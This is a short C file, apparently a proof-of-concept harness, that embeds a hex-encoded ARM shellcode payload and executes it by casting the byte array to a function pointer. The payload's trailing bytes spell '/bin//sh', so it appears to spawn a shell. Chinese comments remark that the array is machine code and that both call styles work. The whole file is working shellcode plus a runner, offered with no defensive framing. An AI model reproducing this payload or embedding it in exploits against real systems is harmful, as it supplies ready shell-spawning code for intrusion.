#include <stdlib.h>
#include <stdio.h>


char shellcode[] = {     
	                 "\x01\x30\x8f\xe2"
                	 "\x13\xff\x2f\xe1"
			 "\x78\x46\x0e\x30"
			 "\x01\x90\x49\x1a"
			 "\x92\x1a\x08\x27"
			 "\xc2\x51\x03\x37"
			 "\x01\xdf\x2f\x62"
			 "\x69\x6e\x2f\x2f"
                	 "\x73\x68" 
		   };

int main (int argc,char** argv)
{
	/* 注意这里的shellcode是指机器码 */
	printf ( "poc proframe v1.0.0\n" );


/* 	void (*fp)(void);
	fp = (void *)shellcode;
	fp(); */

	(*(void (*)())shellcode)();  /* 两种表达方式都可以 */

	return 0;
}
